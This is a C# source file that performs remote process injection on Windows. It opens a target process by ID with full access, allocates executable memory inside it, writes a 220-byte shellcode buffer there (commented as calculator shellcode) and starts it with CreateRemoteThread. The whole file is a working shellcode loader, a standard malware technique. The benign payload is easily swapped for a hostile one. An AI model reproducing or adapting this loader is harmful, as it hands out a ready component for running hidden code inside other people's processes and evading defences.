using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;       


namespace virtualallocex_remoteprocess
{
    class Program
    {
        

        [DllImport("Kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId
            );


        [DllImport("Kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
            );


        [DllImport("Kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            ref int lpNumberOfBytesWritten
            );



        [DllImport("Kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            int dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            int dwCreationFlags,
            IntPtr lpThreadId
            );

        public delegate uint LPTHREAD_START_ROUTINE(IntPtr starting);

        [DllImport("Kernel32.dll")]
        public static extern bool CloseHandle(IntPtr handle);


        [DllImport("Kernel32.dll")]
        public static extern UInt32 GetLastError();

        public delegate int ThreadProc(IntPtr lpParameter);

        public static int sample(IntPtr starting) { return 0; }

        unsafe static void Main(string[] args)
        {

            // calculator shellcode
            byte[] buf = new byte[220] {
0xb8,0xc6,0xbe,0xc8,0xec,0xdb,0xca,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,
0x31,0x83,0xc2,0x04,0x31,0x42,0x0f,0x03,0x42,0xc9,0x5c,0x3d,0x10,0x3d,0x22,
0xbe,0xe9,0xbd,0x43,0x36,0x0c,0x8c,0x43,0x2c,0x44,0xbe,0x73,0x26,0x08,0x32,
0xff,0x6a,0xb9,0xc1,0x8d,0xa2,0xce,0x62,0x3b,0x95,0xe1,0x73,0x10,0xe5,0x60,
0xf7,0x6b,0x3a,0x43,0xc6,0xa3,0x4f,0x82,0x0f,0xd9,0xa2,0xd6,0xd8,0x95,0x11,
0xc7,0x6d,0xe3,0xa9,0x6c,0x3d,0xe5,0xa9,0x91,0xf5,0x04,0x9b,0x07,0x8e,0x5e,
0x3b,0xa9,0x43,0xeb,0x72,0xb1,0x80,0xd6,0xcd,0x4a,0x72,0xac,0xcf,0x9a,0x4b,
0x4d,0x63,0xe3,0x64,0xbc,0x7d,0x23,0x42,0x5f,0x08,0x5d,0xb1,0xe2,0x0b,0x9a,
0xc8,0x38,0x99,0x39,0x6a,0xca,0x39,0xe6,0x8b,0x1f,0xdf,0x6d,0x87,0xd4,0xab,
0x2a,0x8b,0xeb,0x78,0x41,0xb7,0x60,0x7f,0x86,0x3e,0x32,0xa4,0x02,0x1b,0xe0,
0xc5,0x13,0xc1,0x47,0xf9,0x44,0xaa,0x38,0x5f,0x0e,0x46,0x2c,0xd2,0x4d,0x0c,
0xb3,0x60,0xe8,0x62,0xb3,0x7a,0xf3,0xd2,0xdc,0x4b,0x78,0xbd,0x9b,0x53,0xab,
0xfa,0x54,0x1e,0xf6,0xaa,0xfc,0xc7,0x62,0xef,0x60,0xf8,0x58,0x33,0x9d,0x7b,
0x69,0xcb,0x5a,0x63,0x18,0xce,0x27,0x23,0xf0,0xa2,0x38,0xc6,0xf6,0x11,0x38,
0xc3,0x94,0xf4,0xaa,0x8f,0x74,0x93,0x4a,0x35,0x89 };

            UInt32 PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF;
            UInt32 PROCESS_CREATE_THREAD = 0x0002;
            UInt32 PROCESS_QUERY_INFORMATION = 0x0400;
            UInt32 PROCESS_VM_OPERATION = 0x0008;
            UInt32 PROCESS_VM_READ = 0x0010;
            UInt32 PROCESS_VM_WRITE = 0x0020;
            UInt32 MEM_COMMIT = 0x00001000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            UInt32 MEM_DECOMMIT = 0x00004000;
            UInt32 MEM_RESERVE = 0x00002000;

            int shellcode_size = buf.Length;

            //UInt32 desiredaccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
            UInt32 desiredaccess = PROCESS_ALL_ACCESS;
            IntPtr prochandle = OpenProcess(desiredaccess, false,Convert.ToInt32( args[0]));
            Console.WriteLine("Process handle {0}",prochandle);


            IntPtr startingptr = VirtualAllocEx(
                prochandle,
                IntPtr.Zero,
                buf.Length,
                MEM_COMMIT| MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
                );

            Console.WriteLine("Starting ptr of process {0}", startingptr);
            //IntPtr bufptr = new IntPtr(shellcode_size);
            //Marshal.Copy(buf, 0, bufptr, shellcode_size);


            //fixed (byte* bufptr = &buf[0])
            // IntPtr tempptr = bufptr;
            int byteswritten = 0;
            bool res = WriteProcessMemory(
                    prochandle,
                    startingptr,
                    buf,
                    buf.Length,
                    ref byteswritten
                    );
            Console.WriteLine(res);
            Console.WriteLine("Bytes written {0}", byteswritten);


            

            IntPtr tempptr = startingptr;
            ThreadProc tp = Program.sample;
            
           
            IntPtr threadhandle = CreateRemoteThread(
                prochandle,
                IntPtr.Zero,
                0,
                startingptr,
                IntPtr.Zero,
                0,
                IntPtr.Zero
                );
            Console.WriteLine(GetLastError());
            
            Console.WriteLine(threadhandle);

            CloseHandle(prochandle);



        }
    
    }
}
